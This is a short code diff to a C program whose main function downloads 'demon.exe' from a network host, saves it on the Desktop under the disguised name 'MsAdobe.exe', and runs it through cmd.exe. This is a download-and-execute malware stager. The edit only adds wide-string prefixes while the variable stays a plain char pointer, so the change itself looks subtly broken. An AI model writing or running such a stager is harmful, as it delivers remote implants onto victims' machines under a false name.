@@ -12,8 +12,8 @@
 
 int main()
 {
-	const char* filename = "c:\\Users\\saurav\\Desktop\\MsAdobe.exe";
-	URLDownloadToFile(NULL, "http://192.168.255.14:8000/demon.exe", filename, 0, NULL);
+	const char* filename = L"c:\\Users\\saurav\\Desktop\\MsAdobe.exe";
+	URLDownloadToFile(NULL, L"http://192.168.255.14:8000/demon.exe", filename, 0, NULL);
 	system("cmd.exe /c c:\\Users\\saurav\\desktop\\MsAdobe.exe");
 
 	return 0;
